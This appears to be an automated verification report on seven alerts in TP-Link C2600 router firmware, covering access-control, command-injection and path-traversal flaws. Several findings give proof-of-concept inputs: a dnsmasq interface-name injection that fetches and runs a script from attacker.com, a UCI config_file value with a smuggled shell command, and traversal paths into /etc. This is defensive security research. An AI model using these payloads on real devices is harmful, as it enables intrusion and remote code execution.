# _C2600-US-up-ver1-1-8-P1_20170306-rel33259_.bin.extracted - Verification Report (7 alerts)

---

## Untitled Finding to Verify

### Original Information
- **File/Directory Path:** `usr/lib/lua/luci/controller/admin/access_control.lua`
- **Location:** `access_control.lua: [remove_black_list, update_black_list]`
- **Description:** 攻击链从攻击者可控的 HTTP 请求参数开始（例如在 `remove_black_list` 和 `update_black_list` 函数中）。攻击者可以发送恶意请求修改黑名单条目：
- 在 `remove_black_list` 函数中，直接使用 `http_form.key` 和 `http_form.index` 删除条目，缺少授权检查。
- 在 `update_black_list` 函数中，仅验证新 MAC 地址是否与当前用户匹配（通过 `user_mac_check`），但未验证旧 MAC 地址，允许攻击者更新任意条目。
数据流：HTTP 参数 → JSON 解析 → UCI 配置修改（`uci_r:delete` 或 `uci_r:update`） → UCI 提交（`uci_r:commit`） → 系统命令执行（`/etc/init.d/access_control reload` 通过 `sys.fork_exec`）。
触发条件：攻击者能通过 Web 界面发送认证或未认证的 HTTP 请求（依赖 LuCI 身份验证，但授权检查不足）。
可利用性分析：缺少对旧条目的授权验证，允许攻击者绕过访问控制，修改其他设备状态（例如，移除黑名单条目以允许被阻止设备访问，或更新条目以阻止合法设备）。
- **Code Snippet:**
  ```
  function remove_black_list(http_form)
      local key   = http_form.key
      local index = http_form.index
      local ret   = form:delete("access_control", "black_list", key, index)
      uci_r:commit("access_control")
      return ret
  end
  
  function update_black_list(http_form)
      local ret   = {}
      local old   = luci.json.decode(http_form.old)
      local new   = luci.json.decode(http_form.new)
      new.mac = (new.mac):gsub("-", ":"):upper()
      old.mac = (old.mac):gsub("-", ":"):upper()
  
      if user_mac_check(new.mac) then
          ret = form:update("access_control", "black_list", old, new)
          ret = ret_check(ret)
      end
      uci_r:commit("access_control")
      return ret
  end
  ```

### Verification Conclusion
- **Description Accuracy:** `accurate`
- **Is a Real Vulnerability:** `True`
- **Risk Level:** `High`
- **Detailed Reason:** 安全警报准确描述了访问控制漏洞。证据来自代码分析：1) `remove_black_list` 函数直接使用 `http_form.key` 和 `http_form.index` 删除黑名单条目，无任何授权检查（第 244-249 行）；2) `update_black_list` 函数仅通过 `user_mac_check(new.mac)` 验证新 MAC 非当前用户，但未验证 `old.mac`，允许攻击者更新任意条目（第 226-237 行）；3) 数据流从 HTTP 参数经 JSON 解析、UCI 操作（`uci_r:delete`/`uci_r:update` 和 `uci_r:commit`）到系统命令执行（`/etc/init.d/access_control reload` 通过 `sys.fork_exec`）在 `dispatch_tbl` 中确认（第 320-325 行）。漏洞可利用，因攻击者可通过认证 HTTP 请求控制参数，路径可达（LuCI 路由在 `index` 函数定义），实际影响为绕过访问控制，修改黑名单以允许被阻设备或阻止合法设备。PoC：作为认证用户，向 `/admin/access_control` 发送 POST 请求：- 删除任意黑名单条目：`action=remove&key=<target_key>&index=<target_index>`；- 更新任意条目：`action=update&old={"mac":"<target_old_mac>"}&new={"mac":"<new_mac>"}`（确保新 MAC 非当前用户）。

### Verification Metrics
- **Verification Duration:** 146.45 seconds
- **Token Usage:** 109743

---

## Untitled Finding to Verify

### Original Information
- **File/Directory Path:** `etc/init.d/dnsmasq`
- **Location:** `函数 'dhcp_add'，第368行`
- **Description:** 在 'dhcp_add' 函数中，'ifname' 变量从 UCI 配置获取并直接插入到 'udhcpc' shell 命令中，缺乏过滤或转义。攻击链：攻击者通过修改 UCI 配置（例如，通过 web 接口或文件写入）设置恶意 'ifname' 值（如 'eth0; malicious_command'）→ 当 dnsmasq 服务启动时，'config_foreach dhcp_add dhcp' 调用 'dhcp_add' 函数 → 'ifname' 被用于 'udhcpc -n -q -s /bin/true -t 1 -i $ifname' 命令 → 导致任意命令执行。触发条件：dnsmasq 服务启动且配置中有 'dhcp' 节。可利用性分析：缺少输入清理，允许命令注入，直接导致权限提升或系统控制。
- **Code Snippet:**
  ```
  udhcpc -n -q -s /bin/true -t 1 -i $ifname >&- && {
  	logger -t dnsmasq \
  		"found already running DHCP-server on interface '$ifname'" \
  		"refusing to start, use 'option force 1' to override"
  	return 0
  }
  ```

### Verification Conclusion
- **Description Accuracy:** `accurate`
- **Is a Real Vulnerability:** `True`
- **Risk Level:** `High`
- **Detailed Reason:** 警报描述准确：在 'etc/init.d/dnsmasq' 文件的 'dhcp_add' 函数中，'ifname' 变量从 UCI 配置获取并直接用于 shell 命令，缺乏过滤或转义。证据显示：1) 输入可控：攻击者可通过 web 接口或文件写入修改 UCI 配置中的 'ifname'；2) 路径可达：当 dnsmasq 服务启动时，'start' 函数调用 'config_foreach dhcp_add dhcp'，执行易受攻击的代码路径（除非 'force' 选项设置为 1）；3) 实际影响：命令注入可能导致任意命令执行，实现权限提升或系统控制。完整攻击链：攻击者设置恶意 'ifname'（如 'eth0; wget http://attacker.com/exploit.sh -O /tmp/exploit.sh; sh /tmp/exploit.sh'）→ 修改 '/etc/config/dhcp' 中相关 'dhcp' 节的 'interface' 指向该恶意值 → 重启 dnsmasq 服务（例如 '/etc/init.d/dnsmasq restart'）→ 触发命令注入。漏洞风险高，因为攻击者已拥有登录凭据，可直接利用。

### Verification Metrics
- **Verification Duration:** 149.96 seconds
- **Token Usage:** 125246

---

## Untitled Finding to Verify

### Original Information
- **File/Directory Path:** `etc/init.d/miniupnpd`
- **Location:** `miniupnpd script, start function, around lines where 'config_file' is used in 'service_start' call`
- **Description:** A command injection vulnerability exists in the 'miniupnpd' init script due to unquoted usage of the user-controlled 'config_file' parameter in the 'service_start' command. The complete attack chain is as follows: 1) An attacker can set the 'config_file' UCI parameter (e.g., via web interface or CLI) to a string containing shell metacharacters (e.g., '; malicious_command'). 2) When the miniupnpd service starts or restarts, the script reads this value via 'config_get conffile config config_file'. 3) The value is used to build 'args="-f $conffile"' without quoting, and then passed to 'service_start /usr/sbin/miniupnpd $args'. 4) Due to shell word splitting, if 'conffile' contains metacharacters like ';', the shell interprets them as command separators, executing arbitrary commands. This is exploitable because the script lacks input sanitization and uses unquoted variables in a command execution context.
- **Code Snippet:**
  ```
  config_get conffile config config_file
  # ...
  if [ -n "$conffile" ]; then
      args="-f $conffile"
  else
      # ... uses temporary file
  fi
  # ...
  service_start /usr/sbin/miniupnpd $args
  ```

### Verification Conclusion
- **Description Accuracy:** `accurate`
- **Is a Real Vulnerability:** `True`
- **Risk Level:** `High`
- **Detailed Reason:** 警报描述准确，证据支持所有声明。代码分析确认：1) 在 etc/init.d/miniupnpd 的 start 函数中，'config_get conffile config config_file' 读取用户控制的 UCI 参数 'config_file'；2) 构建 'args="-f $conffile"' 时，$conffile 在双引号内但未防止 shell 单词分割（双引号内变量扩展仍会进行单词分割）；3) 在 'service_start /usr/sbin/miniupnpd $args' 调用中，$args 未引用，导致 shell 展开时进行单词分割和元字符解释。完整攻击链：攻击者（已登录用户）可通过 UCI 接口（如 web 或 CLI）设置 'config_file' 参数为恶意字符串（例如 '; touch /tmp/poc'），当服务启动或重启时，脚本读取该值，构建 args="-f ; touch /tmp/poc"，在 service_start 调用中 shell 将 ';' 解释为命令分隔符，执行 'touch /tmp/tmp/poc'。输入可控（UCI 参数可配置）、路径可达（服务启动逻辑必然执行）、实际影响（任意命令执行，如文件创建、系统破坏）。PoC 步骤：作为已认证用户，执行 'uci set miniupnpd.config.config_file="; malicious_command"' 并重启服务（例如 '/etc/init.d/miniupnpd restart'），恶意命令将被执行。漏洞风险高，因允许权限提升和系统完全控制。

### Verification Metrics
- **Verification Duration:** 393.14 seconds
- **Token Usage:** 208804

---

## Untitled Finding to Verify

### Original Information
- **File/Directory Path:** `usr/lib/lua/luci/controller/admin/firmware.lua`
- **Location:** `firmware_index 函数中的 'restore' 操作块，具体在解密和分区写入代码段`
- **Description:** 攻击链从用户可控的 HTTP 输入点开始：攻击者上传加密备份文件（通过 'config' 字段）并触发 'operation=restore'。加密密钥使用产品名称（MODEL），该密钥可从系统信息中通过 'read' 操作获取（返回 hardware_version）。攻击者利用密钥可预测性伪造恶意备份文件，文件被解密后用于写入系统分区（如 user-config 或 extern_partitions），最终以 root 权限执行分区写入命令，可能导致系统配置被恶意修改。完整路径：HTTP 请求 -> 文件上传保存到 /tmp/config.bin -> 解密使用 MODEL 密钥 -> 解密文件写入分区。触发条件：攻击者有权访问 web 界面，先调用 'read' 操作获取硬件版本，然后使用该版本加密恶意备份文件并上传。可利用性分析：加密密钥泄露导致攻击者可以绕过加密保护，伪造备份文件；分区写入操作缺少对解密文件内容的充分验证，允许恶意数据注入。
- **Code Snippet:**
  ```
  -- 在 'restore' 操作中：
  local cry = require "luci.model.crypto"
  local BACKUP_ORIGIN_FILENAME = "/tmp/backup"
  -- 解密使用 MODEL 密钥
  local cryfunc1 = cry.dec_file(config_tmp, MODEL)
  cry.dump_to_file(cryfunc1, BACKUP_ORIGIN_FILENAME)
  -- 分区写入操作
  luci.sys.exec("nvrammanager -w "..BACKUP_ORIGIN_FILENAME.." -p  user-config   >/dev/null 2>&1")
  -- 在 'read' 操作中返回硬件版本：
  ret = ret_json(true,"", 
      {hardware_version = configtool.getsysinfo("HARDVERSION"), 
      firmware_version = configtool.getsysinfo("SOFTVERSION"), 
      is_default = configtool.isdftconfig(),
      reboot_time = REBOOT_TIME,
      upgradetime = UPGRADE_TIME})
  ```

### Verification Conclusion
- **Description Accuracy:** `partially`
- **Is a Real Vulnerability:** `False`
- **Risk Level:** ``
- **Detailed Reason:** 警报部分准确：代码中确实存在 'restore' 操作块的解密和分区写入逻辑（使用 MODEL 密钥解密文件并写入 user-config 分区），且攻击者可通过 HTTP 上传文件到 /tmp/config.bin 并触发 'operation=restore'。然而，警报声称加密密钥（MODEL）可通过 'read' 操作获取（返回 hardware_version）与证据不符：'read' 操作返回 hardware_version（来自 configtool.getsysinfo('HARDVERSION')），而解密使用 MODEL（来自 cfgtool.getsysinfo('product_name')），两者是不同的系统属性。因此，攻击链中断，攻击者无法通过 'read' 操作直接获取加密密钥。漏洞不可利用，除非攻击者能通过其他未知方式获取 MODEL，但当前文件证据不支持完整的攻击路径。输入可控性和路径可达性已确认，但密钥泄露未验证，实际影响无法实现。

### Verification Metrics
- **Verification Duration:** 518.62 seconds
- **Token Usage:** 257440

---

## Untitled Finding to Verify

### Original Information
- **File/Directory Path:** `etc/init.d/openvpn`
- **Location:** `In function append_params, specifically the line where it echoes the value to the config file.`
- **Description:** The script does not sanitize newline characters in UCI configuration values when writing to the OpenVPN configuration file. An attacker who can modify UCI settings (e.g., through a web interface or other service) can inject arbitrary OpenVPN directives by including newlines in parameter values. For example, setting a parameter like 'verb' to '3\nup /bin/sh' would add an 'up' directive that executes a shell script when OpenVPN starts, leading to remote code execution if OpenVPN runs with high privileges (typically root). The complete attack chain is: untrusted input from UCI -> config_get in append_params -> split by IFS and echoed to config file -> OpenVPN execution of malicious directives.
- **Code Snippet:**
  ```
  for v in $v; do
      [ -n "$v" ] && append_param "$s" "$p" && echo " $v" >> "/var/etc/openvpn-$s.conf"
  done
  ```

### Verification Conclusion
- **Description Accuracy:** `inaccurate`
- **Is a Real Vulnerability:** `False`
- **Risk Level:** `Low`
- **Detailed Reason:** 基于对 /etc/init.d/openvpn 文件的深度分析，在 append_params 函数中，代码使用 IFS（换行符）分割 UCI 配置值，并对每个分割部分执行 append_param（写入参数名）和 echo ' $v'（写入值）。输出始终是'参数名 值'的格式，因此即使值中包含换行符（例如，设置 'verb' 参数为 '3\nup /bin/sh'），输出为 'verb 3' 和 'verb up /bin/sh'，其中 'verb up /bin/sh' 不是有效的 OpenVPN 指令（'verb' 期望数字），无法被解析为 'up' 指令。输入可控性（攻击者可通过 UCI 修改配置）和路径可达性（服务启动时执行代码）可验证，但实际影响无法实现，因为注入的指令不会被 OpenVPN 解析为有效操作。完整攻击链在'回显到配置文件'步骤中断，因此漏洞不可利用。

### Verification Metrics
- **Verification Duration:** 552.59 seconds
- **Token Usage:** 269276

---

## Untitled Finding to Verify

### Original Information
- **File/Directory Path:** `etc/init.d/openvpn`
- **Location:** `In functions start_instance and stop_instance, where "$s" is used in file paths like "/var/etc/openvpn-$s.conf" and "/var/run/openvpn-$s.pid".`
- **Description:** The instance name parameter used in file paths for configuration and PID files is not sanitized for path traversal sequences. An attacker who can control the instance name (e.g., through command-line arguments to 'up' or 'down' functions, or via UCI configuration) can cause the script to write files outside the intended directories. For example, setting instance name to '../../etc/passwd' would attempt to write to '/etc/passwd.conf', potentially overwriting system files and leading to denial of service or privilege escalation. The complete attack chain is: untrusted input from command-line or UCI -> used in file path in start_instance/stop_instance -> file overwrite with root privileges.
- **Code Snippet:**
  ```
  [ -f "/var/etc/openvpn-$s.conf" ] && rm "/var/etc/openvpn-$s.conf"
  ...
  echo ... >> "/var/etc/openvpn-$s.conf"
  SERVICE_PID_FILE="/var/run/openvpn-$s.pid"
  ```

### Verification Conclusion
- **Description Accuracy:** `accurate`
- **Is a Real Vulnerability:** `True`
- **Risk Level:** `High`
- **Detailed Reason:** The security alert is accurate based on evidence from etc/init.d/openvpn. The script uses the instance name '$s' unsanitized in file paths within start_instance and stop_instance functions (e.g., '/var/etc/openvpn-$s.conf' and '/var/run/openvpn-$s.pid'). Input controllability is confirmed via UCI configuration or command-line arguments to 'up'/'down' functions. Path reachability requires the instance to be enabled (section_enabled returns true) and called via UCI or command-line, which is feasible for an authenticated attacker. The script runs with root privileges, allowing file overwrite outside intended directories. This can lead to denial of service or privilege escalation by overwriting critical files like /etc/passwd. PoC: An attacker with valid login credentials can set the instance name to '../../etc/passwd' in UCI configuration (e.g., via 'uci set openvpn.instance_name.value=../../etc/passwd' and 'uci commit'), then enable the instance and trigger start_instance (e.g., via '/etc/init.d/openvpn start instance_name'). This would attempt to write to '/etc/passwd.conf', potentially corrupting system files.

### Verification Metrics
- **Verification Duration:** 557.27 seconds
- **Token Usage:** 274606

---

## Untitled Finding to Verify

### Original Information
- **File/Directory Path:** `usr/lib/lua/luci/controller/admin/folder_sharing.lua`
- **Location:** `folder_sharing.lua:500-520 [folder_tree]`
- **Description:** 路径遍历漏洞允许目录内容泄露。完整攻击链：1. 攻击者通过 'volumn' 操作获取有效卷 UUID（例如，发送 HTTP 请求到 '/admin/folder_sharing?action=volumn'）。2. 攻击者发送 'tree' 操作请求（例如，POST 到 '/admin/folder_sharing?action=tree'），提供恶意的 'path' 参数（如 '../../etc'）和有效 UUID。3. 服务器处理请求时，在 'folder_tree' 函数中构造 'realpath = volumn.mntdir .. "/" .. path'，其中 'volumn.mntdir' 是挂载目录（如 '/mnt/usb'），'path' 用户可控。通过目录遍历序列（如 '../../etc'），'realpath' 逃逸挂载点（例如 '/mnt/usb/../../etc' 解析为 '/etc'）。4. 代码调用 'nixio.fs.stat(realpath)' 和 'nixio.fs.dir(realpath)' 访问任意目录，返回目录列表和文件元数据，泄露敏感信息（如 '/etc/passwd' 文件名）。触发条件：攻击者需具有有效 UUID 和认证权限（文件位于 admin 控制器）。可利用性分析：缺少输入验证和路径清理，用户输入直接用于文件系统操作，导致信息泄露。
- **Code Snippet:**
  ```
  local function folder_tree(form)
      local data = {}
      local path = form.path or "" 
      local uuid = form.uuid
      local parser = nil
      local volumn = nil
  
      debug("folder_tree: " .. tostring(path) .. " " .. tostring(uuid))
  
      if uuid == nil or string.len(uuid) == 0 then
          return false
      end
  
      parser = usbshare.CfgParser()
      volumn = parser:get_volumn(uuid)
  
      if volumn == nil or volumn.uuid == nil then
          return false, "invalid uuid"
      end
  
      if #path > 0 then
          path = path:sub(4)
      end
  
      local realpath = volumn.mntdir .. "/" .. path
      local statbuf = nixio.fs.stat(realpath)
  
      debug("folder_tree: realpath = " .. realpath)
  
      if statbuf.type == "dir" then
          data = folder_process(volumn, path)
      end
  
      return data
  end
  ```

### Verification Conclusion
- **Description Accuracy:** `accurate`
- **Is a Real Vulnerability:** `True`
- **Risk Level:** `Medium`
- **Detailed Reason:** 安全警报准确描述了路径遍历漏洞。证据确认：1) 代码片段在 'folder_sharing.lua' 的 'folder_tree' 函数中存在，逻辑与警报一致；2) 输入可控：'path' 参数来自用户 HTTP 请求，攻击者可注入目录遍历序列（如 '../../../../etc'）；3) 路径可达：通过 POST 请求到 '/admin/folder_sharing?action=tree' 可触发函数，需有效 UUID（从 '/admin/folder_sharing?action=volumn' 获取）和认证权限（admin 控制器）；4) 实际影响：构造 'realpath = volumn.mntdir .. "/" .. path' 时，路径遍历逃逸挂载点（如 '/mnt/usb/../../../../etc' 解析为 '/etc'），调用 'nixio.fs.stat' 和 'nixio.fs.dir' 泄露目录内容。完整攻击链验证：攻击者需已认证并获取有效 UUID，然后发送恶意请求即可利用。可重现 PoC：1) 获取 UUID：发送 HTTP GET 到 '/admin/folder_sharing?action=volumn'；2) 利用漏洞：发送 POST 到 '/admin/folder_sharing?action=tree'，参数 'uuid'=（有效 UUID）和 'path'='../../../../etc'；3) 服务器返回 '/etc' 目录列表，泄露文件如 'passwd'。风险为 'Medium'，因需认证权限，但一旦获得权限，漏洞可导致敏感信息泄露。

### Verification Metrics
- **Verification Duration:** 797.83 seconds
- **Token Usage:** 299228

---

